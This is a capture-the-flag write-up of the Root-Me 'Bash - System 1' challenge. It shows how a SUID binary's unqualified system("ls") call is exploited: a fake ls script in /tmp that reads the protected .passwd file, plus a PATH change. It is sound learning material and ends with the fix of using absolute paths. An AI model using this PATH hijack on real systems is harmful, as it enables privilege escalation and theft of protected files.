# Bash - System 1

| | |
|---|---|
| **Category** | App - Script |
| **Difficulty** | Very easy |
| **Points** | 5 |
| **Link** | [Root-Me](https://www.root-me.org/en/Challenges/App-Script/Bash-System-1) |

## Description

Find your way, young padawan!

A C binary executes the command `ls /challenge/app-script/ch11/.passwd` using `system()`.

---

## Analysis

The vulnerable code:

```c
setreuid(geteuid(), geteuid());
system("ls /challenge/app-script/ch11/.passwd");
```

The `system()` function searches for the `ls` command in the **PATH** environment variable. If we create a malicious `ls` executable and prepend its location to PATH, the binary will execute our code instead of the legitimate `ls`.

---

## Methodology

**Step 1: Create a malicious `ls` command**

```bash
cd /tmp
cat > ls << 'EOF'
#!/bin/bash
cat /challenge/app-script/ch11/.passwd
EOF
chmod +x ls
```

**Step 2: Modify the PATH**

```bash
export PATH=/tmp:$PATH
```

**Step 3: Execute the SUID binary**

```bash
/challenge/app-script/ch11/ch11
```

---

## Solution

The SUID binary executes our malicious `ls` script, which outputs the contents of the password file instead of listing the directory.

**Flag validated:** ✓

---

## What I Learned

- PATH hijacking: manipulating command search order
- Insecure system() calls: always use absolute paths (`/bin/ls`) to prevent this attack
- SUID exploitation: leveraging elevated privileges
